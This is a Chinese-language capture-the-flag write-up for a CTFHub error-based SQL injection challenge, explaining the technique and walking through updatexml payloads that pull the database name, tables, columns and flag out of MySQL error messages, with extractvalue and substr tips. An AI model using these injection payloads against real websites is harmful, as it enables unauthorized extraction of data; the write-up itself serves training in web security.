SQL报错注入 - CTFHub Web 入门 Writeup

2026年9月17日 CTFHub Web安全 SQL注入 报错注入

这是我做的第三道 SQL 注入题。这道题和之前的“联合查询注入”完全不同。当页面失去了“回显位”时，我们要利用数据库的“暴脾气”——只要逼它报错，它就会把敏感信息随着错误信息一起吐出来。

一、大白话解释：什么是报错注入？

比喻： 老师（数据库）绝不把答案写在黑板上（没有回显位）。黑客（你）故意写一句语法错的话：“1+1=3，而且我还知道 flag 是 ctfhub{...}”。老师气得大喊（报错）：“你这里语法错了！‘flag 是 ctfhub{...}’这句我看不懂！”——全班都听到了 Flag。

核心逻辑： 利用 updatexml 等函数，强制制造语法错误，把要查的数据拼接到错误信息里，逼数据库自己把数据“喊”出来。

二、踩坑记录：多打一个单引号导致语法错误

我一开始将这道题当成了“字符型注入”，输入了 1' and updatexml(...) #。结果页面直接报错 You have an error in your SQL syntax...。

原因分析： 后台代码并没有用单引号包裹参数（这是数字型注入）。我强行加了一个 '，导致 SQL 语句无法解析。

三、正确解题步骤（数字型报错注入）

1. 查库名

1 and updatexml(1, concat(0x7e, (select database())), 1)

报错信息：XPATH syntax error: '~sqli'。（0x7e 是波浪号 ~，XPath 语法不允许出现它，因此强制报错）。

2. 查表名

1 and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database())), 1)

报错信息：XPATH syntax error: '~news,flag'。查到表名 flag。

3. 查列名

1 and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag')), 1)

报错信息：XPATH syntax error: '~flag'。

4. 终极收割（拿 Flag）

1 and updatexml(1, concat(0x7e, (select flag from flag)), 1)

报错信息里直接弹出了 XPATH syntax error: '~ctfhub{...}'。

最终 Flag： ctfhub{...}（请替换为实际获取的值）

四、报错注入的经典函数

  • updatexml()：参数格式 updatexml(1, concat(0x7e, payload), 1)。
  • extractvalue()：备选函数，格式 extractvalue(1, concat(0x7e, payload))。
  • 注意点：报错注入通常有长度限制（一般是 32 位），如果数据太长，需要用 substr() 分多次提取。
